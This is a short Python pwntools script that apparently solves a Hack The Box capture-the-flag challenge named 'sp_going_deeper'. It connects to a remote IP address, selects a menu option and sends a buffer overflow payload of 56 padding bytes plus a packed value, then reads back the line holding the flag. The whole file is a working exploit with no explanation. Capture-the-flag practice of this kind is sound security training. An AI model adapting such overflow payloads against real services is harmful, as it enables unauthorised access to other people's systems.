from pwn import *

#io = process("./sp_going_deeper")
io = remote("167.99.82.136", 31373)

payload = b"A"*56+ p64(0x01)

io.sendafter(">> ", b"1\n")

io.sendafter("[*] Input: ", payload)

io.recvuntil(b'HTB')

print(io.recvline())


